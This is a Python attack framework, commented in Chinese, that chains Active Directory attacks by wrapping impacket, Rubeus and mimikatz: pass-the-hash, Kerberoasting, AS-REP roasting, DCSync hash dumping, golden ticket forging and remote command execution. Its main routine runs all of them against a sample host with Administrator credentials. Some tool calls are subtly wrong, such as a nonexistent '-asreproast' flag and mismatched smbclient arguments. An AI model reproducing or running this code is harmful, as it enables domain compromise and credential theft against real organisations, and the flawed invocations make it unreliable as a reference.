#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
軍事級AD與橫向移動工具系統
實作 Pass-the-Hash, Pass-the-Ticket, Kerberoasting 等技術
"""

import os
import sys
import json
import time
import hashlib
import base64
import struct
import socket
import threading
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import logging

# 設定日誌
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AttackTechnique(Enum):
    """攻擊技術枚舉"""
    PASS_THE_HASH = "pass_the_hash"
    PASS_THE_TICKET = "pass_the_ticket"
    KERBEROASTING = "kerberoasting"
    ASREPROASTING = "asreproasting"
    DCSYNC = "dcsync"
    GOLDEN_TICKET = "golden_ticket"
    SILVER_TICKET = "silver_ticket"
    SMB_RELAY = "smb_relay"
    LDAP_RELAY = "ldap_relay"
    OVERPASS_THE_HASH = "overpass_the_hash"
    DELEGATION_ATTACK = "delegation_attack"

@dataclass
class ADCredential:
    """AD憑證資料結構"""
    username: str
    password: str = None
    ntlm_hash: str = None
    lm_hash: str = None
    domain: str = None
    sid: str = None
    rid: str = None
    groups: List[str] = None
    privileges: List[str] = None
    last_logon: str = None
    password_last_set: str = None
    account_disabled: bool = False
    account_locked: bool = False

@dataclass
class KerberosTicket:
    """Kerberos票據資料結構"""
    username: str
    service: str
    domain: str
    ticket_data: str
    ticket_type: str  # TGT, ST, or Golden/Silver
    expiration: str = None
    encryption_type: str = None

@dataclass
class ADObject:
    """AD物件資料結構"""
    name: str
    type: str  # user, group, computer, ou
    distinguished_name: str
    sid: str
    properties: Dict[str, Any]
    relationships: List[str] = None

class PassTheHashTools:
    """Pass-the-Hash 工具"""
    
    def __init__(self):
        self.tools = {
            'wmiexec': 'impacket-wmiexec',
            'psexec': 'impacket-psexec',
            'smbclient': 'impacket-smbclient',
            'atexec': 'impacket-atexec'
        }
    
    def execute_with_hash(self, target: str, username: str, ntlm_hash: str, domain: str = None, tool: str = 'wmiexec') -> Dict[str, Any]:
        """使用 Hash 執行命令"""
        try:
            if tool not in self.tools:
                return {'success': False, 'error': '不支援的工具'}
            
            cmd = [self.tools[tool]]
            
            if domain:
                cmd.extend([f"{domain}\\{username}:{ntlm_hash}@{target}"])
            else:
                cmd.extend([f"{username}:{ntlm_hash}@{target}"])
            
            # 添加命令
            cmd.extend(['-c', 'whoami'])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'tool_used': tool,
                'authentication_successful': 'success' in result.stdout.lower() or result.returncode == 0
            }
        except Exception as e:
            logger.error(f"Pass-the-Hash 執行錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def smb_enumeration(self, target: str, username: str, ntlm_hash: str, domain: str = None) -> Dict[str, Any]:
        """SMB 枚舉"""
        try:
            cmd = [self.tools['smbclient']]
            
            if domain:
                cmd.extend([f"//{target}/C$", f"-U", f"{domain}\\{username}%{ntlm_hash}"])
            else:
                cmd.extend([f"//{target}/C$", f"-U", f"{username}%{ntlm_hash}"])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            # 解析 SMB 輸出
            shares = self._parse_smb_shares(result.stdout)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'shares_found': shares,
                'access_granted': 'smb:' in result.stdout
            }
        except Exception as e:
            logger.error(f"SMB 枚舉錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _parse_smb_shares(self, output: str) -> List[str]:
        """解析 SMB 共享"""
        shares = []
        lines = output.split('\n')
        
        for line in lines:
            if 'Disk' in line and '\\' in line:
                share_name = line.split()[0]
                shares.append(share_name)
        
        return shares

class PassTheTicketTools:
    """Pass-the-Ticket 工具"""
    
    def __init__(self):
        self.tools = {
            'klist': 'klist',
            'kinit': 'kinit',
            'kvno': 'kvno'
        }
    
    def extract_tickets(self, target: str) -> Dict[str, Any]:
        """提取票據"""
        try:
            # 使用 klist 列出票據
            cmd = [self.tools['klist']]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            tickets = self._parse_klist_output(result.stdout)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'tickets_found': tickets,
                'total_tickets': len(tickets)
            }
        except Exception as e:
            logger.error(f"票據提取錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def use_ticket(self, ticket_file: str, target: str) -> Dict[str, Any]:
        """使用票據"""
        try:
            # 設置 KRB5CCNAME 環境變數
            env = os.environ.copy()
            env['KRB5CCNAME'] = ticket_file
            
            # 嘗試連接到目標
            cmd = [self.tools['klist'], '-s']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, env=env)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'ticket_valid': result.returncode == 0
            }
        except Exception as e:
            logger.error(f"票據使用錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _parse_klist_output(self, output: str) -> List[Dict[str, str]]:
        """解析 klist 輸出"""
        tickets = []
        lines = output.split('\n')
        
        current_ticket = {}
        for line in lines:
            if 'Ticket cache:' in line:
                if current_ticket:
                    tickets.append(current_ticket)
                current_ticket = {'cache': line.split(':', 1)[1].strip()}
            elif 'Default principal:' in line:
                current_ticket['principal'] = line.split(':', 1)[1].strip()
            elif 'Valid starting' in line:
                current_ticket['valid_from'] = line.split(':', 1)[1].strip()
            elif 'Expires' in line:
                current_ticket['expires'] = line.split(':', 1)[1].strip()
            elif 'renew until' in line:
                current_ticket['renew_until'] = line.split(':', 1)[1].strip()
        
        if current_ticket:
            tickets.append(current_ticket)
        
        return tickets

class KerberoastingTools:
    """Kerberoasting 工具"""
    
    def __init__(self):
        self.tools = {
            'rubeus': 'Rubeus.exe',
            'impacket': 'impacket-GetUserSPNs'
        }
    
    def kerberoast_attack(self, target: str, username: str, password: str, domain: str) -> Dict[str, Any]:
        """執行 Kerberoasting 攻擊"""
        try:
            # 使用 impacket 工具
            cmd = [
                self.tools['impacket'],
                f"{domain}\\{username}:{password}@{target}",
                '-request'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            tickets = self._parse_kerberoast_output(result.stdout)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'tickets_found': tickets,
                'total_tickets': len(tickets)
            }
        except Exception as e:
            logger.error(f"Kerberoasting 攻擊錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def asreproast_attack(self, target: str, username: str, password: str, domain: str) -> Dict[str, Any]:
        """執行 ASREPRoasting 攻擊"""
        try:
            # 使用 impacket 工具
            cmd = [
                self.tools['impacket'],
                f"{domain}\\{username}:{password}@{target}",
                '-asreproast'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            tickets = self._parse_asreproast_output(result.stdout)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'tickets_found': tickets,
                'total_tickets': len(tickets)
            }
        except Exception as e:
            logger.error(f"ASREPRoasting 攻擊錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _parse_kerberoast_output(self, output: str) -> List[Dict[str, str]]:
        """解析 Kerberoasting 輸出"""
        tickets = []
        lines = output.split('\n')
        
        for line in lines:
            if '$krb5tgs$' in line:
                parts = line.split('$')
                if len(parts) >= 6:
                    tickets.append({
                        'type': 'Kerberos',
                        'hash': line.strip(),
                        'service': parts[4] if len(parts) > 4 else 'Unknown',
                        'encryption_type': parts[3] if len(parts) > 3 else 'Unknown'
                    })
        
        return tickets
    
    def _parse_asreproast_output(self, output: str) -> List[Dict[str, str]]:
        """解析 ASREPRoasting 輸出"""
        tickets = []
        lines = output.split('\n')
        
        for line in lines:
            if '$krb5asrep$' in line:
                tickets.append({
                    'type': 'ASREP',
                    'hash': line.strip(),
                    'user': 'Unknown'
                })
        
        return tickets

class DCSyncTools:
    """DCSync 工具"""
    
    def __init__(self):
        self.tools = {
            'secretsdump': 'impacket-secretsdump',
            'mimikatz': 'mimikatz.exe'
        }
    
    def dcsync_attack(self, target: str, username: str, password: str, domain: str) -> Dict[str, Any]:
        """執行 DCSync 攻擊"""
        try:
            # 使用 secretsdump
            cmd = [
                self.tools['secretsdump'],
                f"{domain}\\{username}:{password}@{target}"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            credentials = self._parse_dcsync_output(result.stdout)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'credentials_found': credentials,
                'total_credentials': len(credentials)
            }
        except Exception as e:
            logger.error(f"DCSync 攻擊錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _parse_dcsync_output(self, output: str) -> List[Dict[str, str]]:
        """解析 DCSync 輸出"""
        credentials = []
        lines = output.split('\n')
        
        for line in lines:
            if ':' in line and ('$' in line or 'Administrator' in line):
                parts = line.split(':')
                if len(parts) >= 4:
                    username = parts[0]
                    rid = parts[1]
                    ntlm_hash = parts[2]
                    lm_hash = parts[3] if len(parts) > 3 else None
                    
                    if ntlm_hash and ntlm_hash != 'aad3b435b51404eeaad3b435b51404ee':
                        credentials.append({
                            'username': username,
                            'rid': rid,
                            'ntlm_hash': ntlm_hash,
                            'lm_hash': lm_hash
                        })
        
        return credentials

class GoldenTicketTools:
    """Golden Ticket 工具"""
    
    def __init__(self):
        self.tools = {
            'rubeus': 'Rubeus.exe',
            'mimikatz': 'mimikatz.exe'
        }
    
    def create_golden_ticket(self, domain: str, krbtgt_hash: str, admin_sid: str, username: str = "Administrator") -> Dict[str, Any]:
        """創建 Golden Ticket"""
        try:
            # 使用 Rubeus
            cmd = [
                self.tools['rubeus'],
                'golden',
                '/domain', domain,
                '/krbtgt', krbtgt_hash,
                '/sid', admin_sid,
                '/user', username,
                '/id', '500',
                '/groups', '512,513,518,519,520'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            ticket = self._extract_golden_ticket(result.stdout)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'ticket_created': ticket,
                'ticket_valid': ticket is not None
            }
        except Exception as e:
            logger.error(f"Golden Ticket 創建錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def use_golden_ticket(self, ticket_file: str, target: str) -> Dict[str, Any]:
        """使用 Golden Ticket"""
        try:
            # 設置環境變數
            env = os.environ.copy()
            env['KRB5CCNAME'] = ticket_file
            
            # 測試票據
            cmd = ['klist', '-s']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, env=env)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'ticket_working': result.returncode == 0
            }
        except Exception as e:
            logger.error(f"Golden Ticket 使用錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def _extract_golden_ticket(self, output: str) -> str:
        """提取 Golden Ticket"""
        lines = output.split('\n')
        for line in lines:
            if 'doIF' in line or 'base64' in line.lower():
                return line.strip()
        return None

class LateralMovementTools:
    """橫向移動工具"""
    
    def __init__(self):
        self.tools = {
            'wmiexec': 'impacket-wmiexec',
            'psexec': 'impacket-psexec',
            'smbexec': 'impacket-smbexec',
            'atexec': 'impacket-atexec'
        }
    
    def wmi_execution(self, target: str, username: str, password: str, domain: str, command: str) -> Dict[str, Any]:
        """WMI 執行"""
        try:
            cmd = [
                self.tools['wmiexec'],
                f"{domain}\\{username}:{password}@{target}",
                command
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'command_executed': command,
                'execution_method': 'WMI'
            }
        except Exception as e:
            logger.error(f"WMI 執行錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def smb_execution(self, target: str, username: str, password: str, domain: str, command: str) -> Dict[str, Any]:
        """SMB 執行"""
        try:
            cmd = [
                self.tools['smbexec'],
                f"{domain}\\{username}:{password}@{target}",
                command
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'command_executed': command,
                'execution_method': 'SMB'
            }
        except Exception as e:
            logger.error(f"SMB 執行錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def at_execution(self, target: str, username: str, password: str, domain: str, command: str) -> Dict[str, Any]:
        """AT 執行"""
        try:
            cmd = [
                self.tools['atexec'],
                f"{domain}\\{username}:{password}@{target}",
                command
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'error': result.stderr,
                'command_executed': command,
                'execution_method': 'AT'
            }
        except Exception as e:
            logger.error(f"AT 執行錯誤: {e}")
            return {'success': False, 'error': str(e)}

class MilitaryADLateralMovement:
    """軍事級AD與橫向移動主類別"""
    
    def __init__(self):
        self.pth_tools = PassTheHashTools()
        self.ptt_tools = PassTheTicketTools()
        self.kerberoast_tools = KerberoastingTools()
        self.dcsync_tools = DCSyncTools()
        self.golden_ticket_tools = GoldenTicketTools()
        self.lateral_movement_tools = LateralMovementTools()
        self.attack_log = []
    
    def execute_attack(self, attack_technique: AttackTechnique, target: str, credentials: ADCredential, **kwargs) -> Dict[str, Any]:
        """執行攻擊"""
        try:
            logger.info(f"執行 {attack_technique.value} 攻擊，目標: {target}")
            
            if attack_technique == AttackTechnique.PASS_THE_HASH:
                result = self.pth_tools.execute_with_hash(
                    target, credentials.username, credentials.ntlm_hash, credentials.domain
                )
            elif attack_technique == AttackTechnique.PASS_THE_TICKET:
                result = self.ptt_tools.use_ticket(kwargs.get('ticket_file', ''), target)
            elif attack_technique == AttackTechnique.KERBEROASTING:
                result = self.kerberoast_tools.kerberoast_attack(
                    target, credentials.username, credentials.password, credentials.domain
                )
            elif attack_technique == AttackTechnique.ASREPROASTING:
                result = self.kerberoast_tools.asreproast_attack(
                    target, credentials.username, credentials.password, credentials.domain
                )
            elif attack_technique == AttackTechnique.DCSYNC:
                result = self.dcsync_tools.dcsync_attack(
                    target, credentials.username, credentials.password, credentials.domain
                )
            elif attack_technique == AttackTechnique.GOLDEN_TICKET:
                result = self.golden_ticket_tools.create_golden_ticket(
                    credentials.domain, kwargs.get('krbtgt_hash', ''), kwargs.get('admin_sid', '')
                )
            else:
                result = {'success': False, 'error': '不支援的攻擊技術'}
            
            # 記錄攻擊
            self._log_attack(attack_technique, target, result)
            
            return result
        except Exception as e:
            logger.error(f"攻擊執行錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def comprehensive_ad_attack(self, target: str, credentials: ADCredential) -> Dict[str, Any]:
        """執行綜合 AD 攻擊"""
        results = {}
        
        # 1. Pass-the-Hash
        logger.info("執行 Pass-the-Hash 攻擊...")
        results['pass_the_hash'] = self.pth_tools.execute_with_hash(
            target, credentials.username, credentials.ntlm_hash, credentials.domain
        )
        
        # 2. SMB 枚舉
        logger.info("執行 SMB 枚舉...")
        results['smb_enumeration'] = self.pth_tools.smb_enumeration(
            target, credentials.username, credentials.ntlm_hash, credentials.domain
        )
        
        # 3. Kerberoasting
        logger.info("執行 Kerberoasting 攻擊...")
        results['kerberoasting'] = self.kerberoast_tools.kerberoast_attack(
            target, credentials.username, credentials.password, credentials.domain
        )
        
        # 4. ASREPRoasting
        logger.info("執行 ASREPRoasting 攻擊...")
        results['asreproasting'] = self.kerberoast_tools.asreproast_attack(
            target, credentials.username, credentials.password, credentials.domain
        )
        
        # 5. DCSync
        logger.info("執行 DCSync 攻擊...")
        results['dcsync'] = self.dcsync_tools.dcsync_attack(
            target, credentials.username, credentials.password, credentials.domain
        )
        
        # 6. 橫向移動測試
        logger.info("執行橫向移動測試...")
        results['lateral_movement'] = self.lateral_movement_tools.wmi_execution(
            target, credentials.username, credentials.password, credentials.domain, "whoami"
        )
        
        return {
            'success': True,
            'results': results,
            'summary': self._generate_attack_summary(results)
        }
    
    def _log_attack(self, attack_technique: AttackTechnique, target: str, result: Dict[str, Any]):
        """記錄攻擊"""
        attack_log = {
            'timestamp': datetime.now().isoformat(),
            'attack_technique': attack_technique.value,
            'target': target,
            'success': result.get('success', False),
            'details': result
        }
        self.attack_log.append(attack_log)
    
    def _generate_attack_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """生成攻擊摘要"""
        summary = {
            'total_attacks': len(results),
            'successful_attacks': sum(1 for r in results.values() if r.get('success', False)),
            'credentials_compromised': 0,
            'tickets_obtained': 0,
            'lateral_movement_successful': False,
            'high_risk_findings': []
        }
        
        for attack_name, result in results.items():
            if result.get('success', False):
                if 'credentials_found' in result:
                    summary['credentials_compromised'] += len(result['credentials_found'])
                if 'tickets_found' in result:
                    summary['tickets_obtained'] += len(result['tickets_found'])
                if 'authentication_successful' in result and result['authentication_successful']:
                    summary['lateral_movement_successful'] = True
                if 'high_risk' in result and result.get('high_risk', False):
                    summary['high_risk_findings'].append(attack_name)
        
        return summary
    
    def get_attack_log(self) -> List[Dict[str, Any]]:
        """獲取攻擊日誌"""
        return self.attack_log
    
    def export_results(self, filename: str) -> bool:
        """匯出結果"""
        try:
            data = {
                'attack_log': self.attack_log,
                'timestamp': datetime.now().isoformat(),
                'system_info': {
                    'platform': sys.platform,
                    'python_version': sys.version
                }
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            
            logger.info(f"結果已匯出到: {filename}")
            return True
        except Exception as e:
            logger.error(f"匯出結果錯誤: {e}")
            return False

def main():
    """主程式"""
    print("🎯 軍事級AD與橫向移動工具系統")
    print("=" * 50)
    
    # 初始化系統
    ad_lateral = MilitaryADLateralMovement()
    
    # 測試憑證
    test_credentials = ADCredential(
        username="Administrator",
        password="Password123!",
        ntlm_hash="aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99",
        domain="TESTDOMAIN",
        groups=["Domain Admins", "Enterprise Admins"],
        privileges=["SeDebugPrivilege", "SeBackupPrivilege"]
    )
    
    # 執行綜合 AD 攻擊測試
    print("開始執行綜合 AD 攻擊測試...")
    results = ad_lateral.comprehensive_ad_attack("192.168.1.100", test_credentials)
    
    print(f"攻擊完成，成功: {results['success']}")
    print(f"攻擊摘要: {json.dumps(results['summary'], indent=2, ensure_ascii=False)}")
    
    # 匯出結果
    ad_lateral.export_results("ad_lateral_movement_results.json")
    
    print("AD與橫向移動工具系統測試完成！")

if __name__ == "__main__":
    main()

